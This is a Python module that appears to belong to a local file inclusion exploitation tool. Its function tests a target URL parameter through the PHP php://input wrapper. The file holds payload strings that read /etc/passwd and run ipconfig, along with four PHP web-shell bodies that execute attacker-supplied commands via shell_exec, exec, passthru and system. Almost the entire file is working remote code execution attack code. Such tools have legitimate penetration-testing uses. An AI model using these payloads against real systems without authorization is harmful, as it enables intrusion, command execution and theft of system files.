import urllib.parse as urlparse
from src.utils.arguments import args
from src.configs.config import *
from src.utils.stats import stats
from src.httpreqs.request import prepareRequest
from src.httpreqs.request import REQUEST
from src.utils import colors

def test_input(url, post):
    if(args.postreq):
        if(len(args.postreq) == 1 and "".join(args.postreq)):
            if(args.verbose):
                print(colors.blue("[i]") + " FORM-line arguments with input wrapper are not exploitable. Skipping input wrapper test...")
            return

    if(args.verbose):
        print(colors.blue("[i]") + " Testing with input wrapper...")

    tests = []
    tests.append("php%3a%2f%2finput&cmd=cat%20%2Fetc%2Fpasswd")
    tests.append("php%3a%2f%2finput&cmd=ipconfig")
    
    posts = []
    posts.append("<?php echo(shell_exec($_GET['cmd'])); ?>")
    posts.append("<?php echo(exec($_GET['cmd'])); ?>")
    posts.append("<?php echo(passthru($_GET['cmd'])); ?>")
    posts.append("<?php echo(system($_GET['cmd'])); ?>")

    for i in range(len(tests)):
        u, reqHeaders, _ = prepareRequest(args.param, tests[i], url, post)
        for j in range(len(posts)):
            _, br = REQUEST(u, reqHeaders, posts[j], proxies, "RCE", "INPUT")
            if(not br): return
            if(j == 1 and args.quick): return
    return